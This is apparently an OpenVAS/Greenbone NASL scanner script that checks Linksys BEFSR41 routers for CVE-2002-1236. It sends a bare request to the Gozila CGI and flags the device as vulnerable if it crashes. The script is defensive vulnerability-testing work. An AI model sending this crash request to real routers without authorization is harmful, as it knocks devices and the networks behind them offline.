# SPDX-FileCopyrightText: 2003 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11773");
  script_version("2023-08-03T05:05:16+0000");
  script_cve_id("CVE-2002-1236");
  script_tag(name:"last_modification", value:"2023-08-03 05:05:16 +0000 (Thu, 03 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Linksys Gozila CGI DoS Vulnerability");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/6086");

  script_tag(name:"summary", value:"The Linksys BEFSR41 EtherFast Cable/DSL Router crashes if
  somebody accesses the Gozila CGI without argument on the web administration interface.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the host is
  still alive.");

  script_tag(name:"solution", value:"Update to firmware version 1.42.7 or later.");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

# nb: Ensure that the host is still up
start_denial();
sleep(2);
up = end_denial();
if(!up)
  exit(0);

port = http_get_port(default:80);

start_denial();

# Maybe we should look into the misc CGI directories?
req = http_get(port:port, item:"/Gozila.cgi?");
http_send_recv(port:port, data:req);

alive = end_denial();
if(!alive) {
  security_message(port:port);
  exit(0);
}

exit(99);
